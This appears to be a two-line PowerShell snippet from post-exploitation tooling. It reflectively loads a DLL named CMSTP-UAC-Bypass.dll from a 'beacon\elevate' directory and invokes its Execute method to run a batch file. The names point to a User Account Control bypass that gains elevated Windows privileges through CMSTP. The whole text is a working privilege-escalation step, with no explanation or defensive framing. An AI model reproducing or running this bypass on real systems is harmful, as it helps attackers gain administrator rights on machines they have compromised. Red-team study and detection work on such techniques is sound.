[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("C:\temp\beacon\elevate\CMSTP-UAC-Bypass.dll")) | Out-Null

[CMSTPBypass]::Execute("C:\temp\beacon\elevate\batch.bat") | Out-Null